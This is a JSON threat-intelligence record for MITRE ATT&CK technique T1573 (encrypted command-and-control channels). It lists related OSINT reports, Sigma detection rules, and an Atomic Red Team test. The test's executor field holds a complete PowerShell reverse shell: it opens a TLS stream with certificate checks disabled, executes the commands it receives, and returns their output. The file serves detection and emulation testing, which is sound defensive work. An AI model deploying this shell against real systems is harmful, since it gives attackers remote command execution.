{
    "id": "T1573",
    "name": "Encrypted Channel",
    "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Command and Control",
    "data_sources": "Network Traffic: Network Traffic Content",
    "detection": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1573",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "0f2468a2-5055-4212-a368-7321198ee706",
                    "eb4ee171-8930-4c15-8917-9af8775417fb",
                    "2ebc21a4-5635-4a7d-9553-ec5f58be0ee6",
                    "d8b0a4fe-07a8-41be-bd39-b14afa025d95",
                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
                    "a3501e8e-af9e-43c6-8cd6-9360bdaae498",
                    "195626f3-5f1b-4403-93b7-e6cfd4d6a078",
                    "2e1474e1-1a53-4124-966f-b3bbface35df",
                    "b8902400-e6c5-4ba2-95aa-2d35b442b118"
                ],
                "lookup_results": [
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0f2468a2-5055-4212-a368-7321198ee706",
                        "lookup_data": {
                            "description": "Detects when a Microsoft Cloud App Security reported when an activity occurs from a location that wasn't recently or never visited by any user in the organization.",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/23\ndescription: Detects when a Microsoft Cloud App Security reported when an activity\n  occurs from a location that wasn't recently or never visited by any user in the\n  organization.\ndetection:\n  condition: selection\n  selection:\n    eventName: Activity from infrequent country\n    eventSource: SecurityComplianceCenter\n    status: success\nfalsepositives:\n- Unknown\nid: 0f2468a2-5055-4212-a368-7321198ee706\nlevel: medium\nlogsource:\n  product: m365\n  service: threat_management\nmodified: 2022/10/09\nreferences:\n- https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy\n- https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1573\ntitle: Activity from Infrequent Country\n",
                            "sigma:id": "0f2468a2-5055-4212-a368-7321198ee706",
                            "title": "Activity from Infrequent Country",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eb4ee171-8930-4c15-8917-9af8775417fb",
                        "lookup_data": {
                            "description": "CERT-FR report extended - sandworm intrusion set campaign targeting Centreon systems",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/eb4ee171-8930-4c15-8917-9af8775417fb.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1613463604",
                            "uuid": "eb4ee171-8930-4c15-8917-9af8775417fb",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2ebc21a4-5635-4a7d-9553-ec5f58be0ee6",
                        "lookup_data": {
                            "description": "OSINT - Kobalos â€“ A complex Linux threat to high performance computing infrastructure",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/2ebc21a4-5635-4a7d-9553-ec5f58be0ee6.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1612271360",
                            "uuid": "2ebc21a4-5635-4a7d-9553-ec5f58be0ee6",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d8b0a4fe-07a8-41be-bd39-b14afa025d95",
                        "lookup_data": {
                            "description": "Detects when a Microsoft Cloud App Security reported when users were active from an IP address that has been identified as an anonymous proxy IP address.",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/23\ndescription: Detects when a Microsoft Cloud App Security reported when users were\n  active from an IP address that has been identified as an anonymous proxy IP address.\ndetection:\n  condition: selection\n  selection:\n    eventName: Activity from anonymous IP addresses\n    eventSource: SecurityComplianceCenter\n    status: success\nfalsepositives:\n- User using a VPN or Proxy\nid: d8b0a4fe-07a8-41be-bd39-b14afa025d95\nlevel: medium\nlogsource:\n  product: m365\n  service: threat_management\nmodified: 2022/10/09\nreferences:\n- https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy\n- https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1573\ntitle: Activity from Anonymous IP Addresses\n",
                            "sigma:id": "d8b0a4fe-07a8-41be-bd39-b14afa025d95",
                            "title": "Activity from Anonymous IP Addresses",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                        "lookup_data": {
                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1666603345",
                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a3501e8e-af9e-43c6-8cd6-9360bdaae498",
                        "lookup_data": {
                            "description": "Detects when a Microsoft Cloud App Security reported users were active from an IP address identified as risky by Microsoft Threat Intelligence.\nThese IP addresses are involved in malicious activities, such as Botnet C&C, and may indicate compromised account.\n",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/23\ndescription: 'Detects when a Microsoft Cloud App Security reported users were active\n  from an IP address identified as risky by Microsoft Threat Intelligence.\n\n  These IP addresses are involved in malicious activities, such as Botnet C&C, and\n  may indicate compromised account.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    eventName: Activity from suspicious IP addresses\n    eventSource: SecurityComplianceCenter\n    status: success\nfalsepositives:\n- Unknown\nid: a3501e8e-af9e-43c6-8cd6-9360bdaae498\nlevel: medium\nlogsource:\n  product: m365\n  service: threat_detection\nmodified: 2022/10/09\nreferences:\n- https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy\n- https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1573\ntitle: Activity from Suspicious IP Addresses\n",
                            "sigma:id": "a3501e8e-af9e-43c6-8cd6-9360bdaae498",
                            "title": "Activity from Suspicious IP Addresses",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "195626f3-5f1b-4403-93b7-e6cfd4d6a078",
                        "lookup_data": {
                            "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
                            "raw": "author: frack113\ndate: 2022/01/23\ndescription: Adversaries may employ a known encryption algorithm to conceal command\n  and control traffic rather than relying on any inherent protections provided by\n  a communication protocol.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - System.Net.Security.SslStream\n    - Net.Security.RemoteCertificateValidationCallback\n    - .AuthenticateAsClient\nfalsepositives:\n- Legitimate administrative script\nid: 195626f3-5f1b-4403-93b7-e6cfd4d6a078\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1573/T1573.md#atomic-test-1---openssl-c2\n- https://medium.com/walmartglobaltech/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1573\ntitle: Suspicious SSL Connection\n",
                            "sigma:id": "195626f3-5f1b-4403-93b7-e6cfd4d6a078",
                            "title": "Suspicious SSL Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2e1474e1-1a53-4124-966f-b3bbface35df",
                        "lookup_data": {
                            "description": "Lookout Uncovers Android Spyware Deployed in Kazakhstan",
                            "link": "http://www.botvrij.eu/data/feed-osint/2e1474e1-1a53-4124-966f-b3bbface35df.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1655836311",
                            "uuid": "2e1474e1-1a53-4124-966f-b3bbface35df",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b8902400-e6c5-4ba2-95aa-2d35b442b118",
                        "lookup_data": {
                            "mitre-attack-id": "T1573",
                            "mitre-cti:description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                            "mitre-cti:name": "Encrypted Channel",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118', 'type': 'attack-pattern', 'created': '2020-03-16T15:33:01.739Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1573', 'url': 'https://attack.mitre.org/techniques/T1573'}, {'url': 'http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840', 'description': 'Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.', 'source_name': 'SANS Decrypting SSL'}, {'url': 'https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html', 'description': 'Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.', 'source_name': 'SEI SSL Inspection Risks'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2021-04-20T19:27:46.650Z', 'name': 'Encrypted Channel', 'description': 'Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_detection': 'SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\\n\\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)', 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1573",
                "display_name": "Encrypted Channel",
                "atomic_tests": [
                    {
                        "name": "OpenSSL C2",
                        "auto_generated_guid": "21caf58e-87ad-440c-a6b8-3ac259964003",
                        "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "server_ip": {
                                "description": "IP of the external server",
                                "type": "string",
                                "default": "127.0.0.1"
                            },
                            "server_port": {
                                "description": "The port to connect to on the external server",
                                "type": "string",
                                "default": "443"
                            }
                        },
                        "executor": {
                            "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 17:19:54"
}